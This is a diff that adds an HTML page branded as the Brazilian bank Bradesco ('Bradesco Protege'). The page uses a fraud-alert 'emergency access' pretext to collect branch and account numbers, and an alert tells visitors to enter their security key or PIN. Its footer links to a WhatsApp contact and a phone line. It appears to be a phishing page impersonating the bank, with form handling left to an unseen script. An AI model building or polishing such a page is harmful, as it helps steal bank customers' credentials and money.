@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Bradesco Protege</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- Logo -->
+  <img src="img/bradesco-logo.png" alt="Logo Bradesco" width="150">
+
+  <!-- Título e escudo -->
+  <h1>Bradesco Protege</h1>
+  <div class="seguranca-box">
+    <span class="escudo">🛡️</span>
+    <p>Este canal é reservado para acessos emergenciais em caso de atividade suspeita ou risco de fraude.</p>
+  </div>
+
+  <!-- Campo Agência -->
+  <label for="agencia">Agência</label><br>
+  <input type="text" id="agencia" maxlength="4" oninput="validarAgencia(this)"><br>
+
+  <!-- Campo Conta -->
+  <label for="conta">Conta</label><br>
+  <input type="text" id="conta" maxlength="8" oninput="formatarConta(this)"><br>
+
+  <!-- Botão de acesso -->
+  <button onclick="validarEAvancar()">Acessar conta</button>
+
+  <!-- Rodapé com botões -->
+  <div class="footer">
+    <button onclick="alert('🔐 Digite sua chave de segurança ou PIN para continuar.')">🔑 Chave de Segurança</button>
+    <button onclick="window.open('https://wa.me/551133350237', '_blank')">🤖 BIA</button>
+    <button onclick="window.location.href='tel:08007279933'">📞 SAC/Ouvidoria</button>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
